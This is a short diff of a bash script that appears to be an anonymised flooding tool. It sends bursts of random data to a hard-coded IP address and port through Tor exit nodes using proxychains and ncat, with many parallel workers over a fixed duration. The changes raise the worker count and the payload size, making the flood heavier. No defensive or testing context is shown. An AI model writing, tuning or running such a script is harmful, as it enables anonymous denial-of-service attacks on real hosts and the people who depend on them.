@@ -3,7 +3,7 @@
 TARGET_IP="47.56.125.133"
 PORT=48533
 DURATION=600
-MAX_PARALLEL=100
+MAX_PARALLEL=120
 TORRC="/etc/tor/torrc"
 DATA_DIR="/var/lib/tor/tor1"
 
@@ -68,7 +68,7 @@ get_valid_exit_ip() {
 
 do_tcp_test() {
   local id=$1
-  dd if=/dev/urandom bs=800 count=1 2>/dev/null | \
+  dd if=/dev/urandom bs=1024 count=1 2>/dev/null | \
   timeout 8 proxychains ncat -w 5 $TARGET_IP $PORT >/dev/null 2>&1
 
   if [ $? -eq 0 ]; then
